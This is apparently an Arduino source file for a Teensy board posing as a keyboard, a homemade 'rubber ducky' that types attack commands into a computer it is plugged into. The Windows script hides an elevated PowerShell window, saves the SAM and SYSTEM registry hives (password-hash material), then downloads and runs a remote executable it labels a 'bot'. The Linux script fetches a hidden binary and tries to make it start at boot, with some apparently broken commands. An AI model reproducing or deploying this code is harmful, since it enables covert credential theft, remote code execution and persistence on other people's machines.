/*
 * Made by papiii
 * teensyduck.ino
 * 
 * Rubberducky Remake with a teensy by papiii
 * It has a builtin password typer. Executes Basic rubber-ducky
 * scripts.
 */
 
//My keyboard lib
#include "teensyduck.h"

int main_code();
void script();
void sscript();

void setup()
{

	delay(1000);
  
	pinMode(ledPin, OUTPUT);
	pinMode(noExecPin, INPUT);
	pinMode(passwdPin, INPUT);

	// enable internal pull-ups
	digitalWrite(noExecPin, 1);
	digitalWrite(passwdPin, 1);

	main_code();

}

void loop()
{

	// This code can be re-executed if needed
	// eg: Re type password.
	if(digitalRead(noExecPin) != HIGH){
		setup();
	}else if(digitalRead(passwdPin) != HIGH){
		enterPass();
	}

}

int main_code()
{

	if(digitalRead(noExecPin) != HIGH){
		pauseScript();
	} else if(digitalRead(passwdPin) != HIGH){
		sscript();
	} else {
		script();
	}
	resetKey();

	return 0;
}

// Rubber ducky 
//Main script:
//  install p4p1 bot
void script()
{
	pressModifier(MODIFIERKEY_GUI);
	pressKey(KEY_D);
	resetKey();
	pressModifier(MODIFIERKEY_GUI);
	resetKey();
	DELAY;
	Keyboard.print("powershell");
	DELAY;
	Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
	Keyboard.send_now();
	pressKey(KEY_ENTER);
	resetKey();
	DELAY;
	pressModifier(MODIFIERKEY_ALT);
	pressKey(KEY_O);
	resetKey();
	DELAY;
	pressModifier(MODIFIERKEY_ALT);
	pressKey(KEY_SPACE);
	resetKey();
	delay(500);
	pressKey(KEY_L);
	resetKey();
	delay(500);
	for(int i = 0; i < 70; i++){
		pressKey( KEY_DOWN_ARROW );
	}
	delay(700);
	pressKey(KEY_ENTER);
	pressKey(KEY_ENTER);
	Keyboard.print("reg.exe save HKLM\\SAM sam ; reg.exe save HKLM\\SYSTEM sys");
	pressKey(KEY_ENTER);
	Keyboard.print("(new-object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/p4p1/Projects/master/ExecuteDump/winupdate.exe\",\"winupdate.exe\") ; .\\winupdate.exe");
	pressKey(KEY_ENTER);
}

//Second script: 
// Wallpaper breaker :)
void sscript()
{
	pressModifier(MODIFIERKEY_GUI);
	resetKey();
	delay(600);
	Keyboard.print("terminal");
	pressKey(KEY_ENTER);
	delay(1000);
	Keyboard.print("wget \"https://raw.githubusercontent.com/p4p1/Projects/master/ExecuteDump/ch.x\"; chmod 755 ch.x ; mkdr ~/.bd ; mv ch.x .bd/.ch.x; echo /home/$WHOAMI/.bd/ch.x > /etc/rc.local");
	pressKey(KEY_ENTER);
	delay(1000);
	Keyboard.print("exit");
	pressKey(KEY_ENTER);
}
